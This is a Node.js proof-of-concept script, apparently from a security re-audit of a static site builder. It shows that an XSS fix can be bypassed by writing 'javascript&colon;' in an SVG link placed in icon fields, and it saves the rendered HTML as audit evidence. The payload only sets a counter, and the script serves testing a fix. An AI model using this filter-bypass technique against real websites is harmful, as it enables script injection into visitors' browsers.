// Reproduces: stored XSS via {{& icon}} raw sink in build.js, bypassing the
// tab/CR/LF + numeric-entity normalization added as the "fix" for the
// original F1 finding, using a NAMED HTML character reference (&colon;)
// instead of a numeric one. The normalizer only decodes &#NN; / &#xHH;, not
// named references, so "javascript&colon;alert(1)" sails through the scheme
// check unmodified — but a real browser's HTML parser decodes &colon; to ':'
// while parsing the attribute, same as it does for &#106;.
'use strict';
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
const path = require('path');
const fs = require('fs');
const ROOT = '/Users/Work/Desktop/sitebuilder/.claude/worktrees/agent-a3a347f1a5502f4b2';
const build = require(path.join(ROOT, 'build.js'));
const presets = JSON.parse(fs.readFileSync(path.join(ROOT, 'templates/portfolio/presets.json'), 'utf8'));
const templateHtml = fs.readFileSync(path.join(ROOT, 'templates/portfolio/template.html'), 'utf8');

// Use the first preset's config as a realistic full config (same shape publish would store).
const config = JSON.parse(JSON.stringify(presets.presets[0].config));

const PAYLOAD = "<svg viewBox='0 0 24 24'><a xlink:href=\"javascript&colon;window.__hb_xss=(window.__hb_xss||0)+1\"><text x=\"2\" y=\"14\">X</text></a></svg>";

// Find a services-like array with an `icon` field and poison the first one.
function poisonIcons(obj) {
  let count = 0;
  function walk(o) {
    if (Array.isArray(o)) { o.forEach(walk); return; }
    if (o && typeof o === 'object') {
      if (typeof o.icon === 'string') { o.icon = PAYLOAD; count++; }
      for (const k of Object.keys(o)) walk(o[k]);
    }
  }
  walk(obj);
  return count;
}
const poisoned = poisonIcons(config);
console.log('icon fields poisoned:', poisoned);

const html = build.renderHtml(templateHtml, config);

const idx = html.indexOf('window.__hb_xss');
console.log('payload present verbatim in rendered HTML:', idx !== -1);
if (idx !== -1) {
  console.log('--- context ---');
  console.log(html.slice(Math.max(0, idx - 200), idx + 100));
}
console.log('contains literal "javascript:" (would mean the OLD naive check would catch it):', html.includes('javascript:'));
console.log('contains "javascript&colon;" (unmodified, bypassing the normalizer):', html.includes('javascript&colon;') || html.includes('javascript&#'));

fs.writeFileSync(path.join(ROOT, '04-QA-Evidence/Reaudit-2026-09-06/backend-security/xss-icon-colon-rendered.html'), html);
console.log('full rendered HTML written to xss-icon-colon-rendered.html');
